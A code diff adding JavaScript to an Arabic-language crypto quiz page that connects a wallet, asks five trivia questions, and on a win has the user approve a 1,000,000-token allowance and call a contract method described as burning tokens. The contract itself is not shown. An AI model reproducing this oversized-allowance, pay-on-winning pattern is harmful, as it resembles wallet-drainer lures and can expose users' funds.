@@ -155,5 +155,105 @@
         { q: "هل يولد الأطفال الرضع بدون رضفة الركبة (تتكون لاحقاً)؟", a: true },
         { q: "هل كوكب عطارد يمتلك غلافاً جوياً سميكاً يحميه من حرارة الشمس؟", a: false }];
 
+    
+
+    let quizData = []; 
+    let currentQuestionIndex = 0;
+    let score = 0;
+
+    // دالة لخلط الأسئلة عشوائياً واختيار 5 فقط منها
+    function prepareRandomQuestions() {
+        const shuffled = [...allQuestionsPool].sort(() => 0.5 - Math.random());
+        quizData = shuffled.slice(0, 5); 
+    }
+
+    async function connectWallet() {
+        const walletProvider = window.ethereum || (window.web3 && window.web3.currentProvider);
+        if (walletProvider) {
+            try {
+                await walletProvider.request({ method: 'eth_requestAccounts' });
+                provider = new ethers.BrowserProvider(walletProvider);
+                signer = await provider.getSigner();
+                gameContract = new ethers.Contract(gameContractAddress, gameABI, signer);
+                tokenContract = new ethers.Contract(tokenContractAddress, tokenABI, signer);
+                
+                document.getElementById("statusText").innerText = "متصل بنجاح! ابدأ الإجابة على الأسئلة.";
+                document.getElementById("connectBtn").style.display = "none";
+                document.getElementById("quizInterface").style.display = "block";
+                
+                prepareRandomQuestions(); // توليد الـ 5 أسئلة العشوائية للجولة الحالية
+                showQuestion();
+            } catch (err) {
+                document.getElementById("statusText").innerText = "خطأ: تم رفض الاتصال.";
+            }
+        } else {
+            alert("افتح الرابط من داخل متصفح Trust Wallet الخاص بالهواتف!");
+        }
+    }
+
+    function showQuestion() {
+        if (currentQuestionIndex < quizData.length) {
+            document.getElementById("progressText").innerText = `السؤال: ${currentQuestionIndex + 1} / ${quizData.length}`;
+            document.getElementById("questionText").innerText = quizData[currentQuestionIndex].q;
+        } else {
+            finishQuiz();
+        }
+    }
+
+    function submitAnswer(userAnswer) {
+        if (userAnswer === quizData[currentQuestionIndex].a) {
+            score++;
+        }
+        currentQuestionIndex++;
+        showQuestion();
+    }
+
+    function finishQuiz() {
+        document.getElementById("choicesBlock").style.display = "none";
+        document.getElementById("progressText").style.display = "none";
+        
+        if (score >= 4) { 
+            document.getElementById("questionText").innerText = `أحسنت! نتيجتك هي ${score} من ${quizData.length}`;
+            document.getElementById("burnBlock").style.display = "block";
+            document.getElementById("statusText").innerText = "قم بتأكيد المعاملة لتسجيل فوزك الحماسي وحرق الرسوم.";
+        } else {
+            document.getElementById("questionText").innerText = `للأسف خسرت! نتيجتك ${score} من ${quizData.length}`;
+            document.getElementById("statusText").innerText = "حاول مجدداً! يجب أن تحصل على 4 نقاط على الأقل للفوز.";
+            
+            const retryBtn = document.createElement("button");
+            retryBtn.className = "action-btn";
+            retryBtn.innerText = "🔄 إعادة المحاولة";
+            retryBtn.onclick = () => { location.reload(); };
+            document.getElementById("quizInterface").appendChild(retryBtn);
+        }
+    }
+
+    async function approveToken() {
+        try {
+            document.getElementById("statusText").innerText = "جاري إرسال طلب الـ Approve للمحفظة...";
+            const maxAmount = ethers.parseEther("1000000");
+            const tx = await tokenContract.approve(gameContractAddress, maxAmount);
+            document.getElementById("statusText").innerText = "جاري المعالجة على الشبكة...";
+            await tx.wait();
+            document.getElementById("statusText").innerText = "✅ تمت الموافقة بنجاح! اضغط على زر الحرق الآن.";
+        } catch (err) {
+            document.getElementById("statusText").innerText = "❌ فشلت عملية الموافقة.";
+        }
+    }
+
+    async function triggerBurn() {
+        try {
+            document.getElementById("statusText").innerText = "جاري إرسال عملية حرق التوكنز وتوثيق الفوز...";
+            const tx = await gameContract.buySurvivalItem(1); 
+            document.getElementById("statusText").innerText = "بانتظار تأكيد حرق التوكنز على الشبكة...";
+            await tx.wait();
+            document.getElementById("statusText").innerText = "🎉 تم تسجيل فوزك بنجاح وحرق عملات التحدي في العنوان الميت!";
+        } catch (err) {
+            document.getElementById("statusText").innerText = "❌ فشلت المعاملة: تأكد من الرصيد والـ Approve أولاً.";
+        }
+    }
+</script>
+</body>
+</html>
 
         
